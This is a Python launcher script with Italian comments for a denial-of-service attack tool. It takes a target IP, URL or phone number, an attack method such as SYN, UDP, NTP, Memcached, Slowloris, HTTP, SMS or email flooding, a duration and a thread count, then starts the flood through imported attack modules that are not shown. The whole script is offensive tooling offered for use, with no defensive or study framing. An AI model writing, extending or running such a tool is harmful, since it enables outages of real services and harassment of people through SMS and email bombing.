import os
import sys
import argparse

# Go to current dir
os.chdir(os.path.dirname(os.path.realpath(__file__)))

try:
    from tools.crash import CriticalError
    import tools.addons.clean
    import tools.addons.logo
    import tools.addons.winpcap
    from tools.method import AttackMethod
except ImportError as err:
    CriticalError("Impossibile importare alcuni moduli", err)
    sys.exit(1)

# Parsa gli argomenti
parser = argparse.ArgumentParser(description="Strumento di attacco Denial-of-Service")
parser.add_argument(
    "--target",
    type=str,
    metavar="<IP:PORTA, URL, TELEFONO>",
    help="Indirizzo IP:porta, URL o numero di telefono del bersaglio",
)
parser.add_argument(
    "--method",
    type=str,
    metavar="<SMS/EMAIL/NTP/UDP/SYN/ICMP/POD/SLOWLORIS/MEMCACHED/HTTP>",
    help="Metodo di attacco",
)
parser.add_argument(
    "--time", type=int, default=10, metavar="<tempo>", help="tempo in secondi"
)
parser.add_argument(
    "--threads", type=int, default=3, metavar="<threads>", help="numero di threads (1-200)"
)

# Ottieni gli argomenti
args = parser.parse_args()
threads = args.threads
time = args.time
method = str(args.method).upper()
target = args.target

if __name__ == "__main__":
    # Stampa l'aiuto
    if not method or not target or not time:
        parser.print_help()
        sys.exit(1)

    # Esegui l'attacco DDoS
    with AttackMethod(
        duration=time, name=method, threads=threads, target=target
    ) as Flood:
        print(f"Avvio dell'attacco DDoS con metodo {method} su {target} per {time} secondi...")
        Flood.Start()
        print("Attacco completato.")
